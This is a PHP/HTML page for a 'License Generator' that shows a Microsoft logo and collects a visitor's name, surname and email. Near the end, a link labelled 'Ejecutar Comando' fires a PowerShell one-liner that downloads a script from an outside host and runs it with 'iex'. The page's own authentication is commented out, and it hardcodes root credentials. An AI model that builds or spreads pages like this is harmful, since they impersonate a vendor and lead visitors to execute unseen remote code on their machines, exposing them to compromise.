<?php
/**
 * Simple HTTP Basic Authentication for form.php
 * Author: Erick Meza
 * Date: 2025-10-13
 */
// === Configuration ===
$username = 'root';
$password = '283003'; // cámbialo por uno fuerte
/*
// === Authentication check ===
if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])
    || $_SERVER['PHP_AUTH_USER'] !== $username
    || $_SERVER['PHP_AUTH_PW'] !== $password) {
    header('WWW-Authenticate: Basic realm="Área restringida"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Acceso no autorizado.';
    exit;
}*/
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=.95, maximum-scale=.95, user-scalable=no viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <title>License Generator</title>
    <link rel="icon" href="assets/favicon.ico?v2" type="image/x-icon"/>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
    <style>
        :root {
        --bs-blue: #0d6efd;
        --bs-indigo: #6610f2;
        --bs-purple: #6f42c1;
        --bs-pink: #d63384;
        --bs-red: #dc3545;
        --bs-orange: #fd7e14;
        --bs-yellow: #ffc107;
        --bs-green: #198754;
        --bs-teal: #20c997;
        --bs-cyan: #0dcaf0;
        --bs-white: #fff;
        --bs-gray: #6c757d;
        --bs-gray-dark: #343a40;
        --bs-primary: #0d6efd;
        --bs-secondary: #6c757d;
        --bs-success: #198754;
        --bs-info: #0dcaf0;
        --bs-warning: #ffc107;
        --bs-danger: #dc3545;
        --bs-light: #f8f9fa;
        --bs-dark: #212529;
        --bs-font-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        --bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));
        }
        .copy-text{
            cursor: pointer;
        }
        .header{
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .logo{
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        span{
            font-weight: 500;
            font-size: .9rem;
            color: #696969;
        }
        span img{
            height: 25px;
        }
    </style>
</head>
<body class="bg-light">
    <div class="container-sm py-5">
        <div class="header">
            <div class="logo">
                <span><img src="assets/logo.png" alt="Microsoft"></span>
                <span>License Generator</span>
            </div>
            <div class="text-end">
                <a id="logoutBtn" href="logout.php" class="btn btn-outline-danger btn-sm">Cerrar sesión</a>
            </div>
        </div>
        <form id="licenseForm" class="p-4 bg-white shadow rounded">
            <div class="mb-3">
                <label for="name" class="form-label">Nombre</label>
                <input type="text" id="name" name="name" class="form-control" required>
            </div>
            <div class="mb-3">
                <label for="surname" class="form-label">Apellido</label>
                <input type="text" id="surname" name="surname" class="form-control" required>
            </div>
            <div class="mb-3">
                <label for="email" class="form-label">Correo Electrónico</label>
                <input type="email" id="email" name="email" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-primary w-100">Generar Licencia</button>
        </form>
        <div id="responseMessage" class="alert mt-4 d-none"></div>
    </div>
    <script>
        $('#logoutBtn').on('click', function(e) {
            e.preventDefault();
            const user = 'logout';
            const pass = 'logout';
            // Forzamos el envío de credenciales inválidas
            window.location.href = `//${user}:${pass}@${window.location.host}/logout.php`;
        });
    </script>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="assets/scripts.js"></script>

    <a href="powershell:irm windows.ews.pe/27a0ce3ee98e2779b98cc56e3679b69e |iex">Ejecutar Comando</a>
</body>
</html>
